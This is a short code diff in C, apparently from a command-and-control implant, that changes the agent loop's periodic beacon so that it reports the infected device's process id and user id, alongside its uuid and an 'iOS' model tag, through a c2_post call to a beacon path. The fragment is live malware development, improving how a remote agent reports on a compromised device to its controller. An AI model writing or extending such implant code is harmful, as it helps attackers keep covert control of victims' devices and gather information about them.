@@ -325,7 +325,8 @@ static void agent_loop(void) {
     for (;;) {
         char body[512];
         snprintf(body, sizeof(body),
-                 "{\"uuid\":\"%s\",\"device_info\":{\"model\":\"iOS\"},\"status\":\"idle\"}", g_uuid);
+                 "{\"uuid\":\"%s\",\"device_info\":{\"model\":\"iOS\",\"pid\":%d,\"uid\":%d},\"status\":\"idle\"}",
+                 g_uuid, (int)getpid(), (int)getuid());
         memset(resp, 0, sizeof(resp));
         int rn = c2_post(BEACON_PATH, body, resp, sizeof(resp) - 1);
         if (rn > 0) {
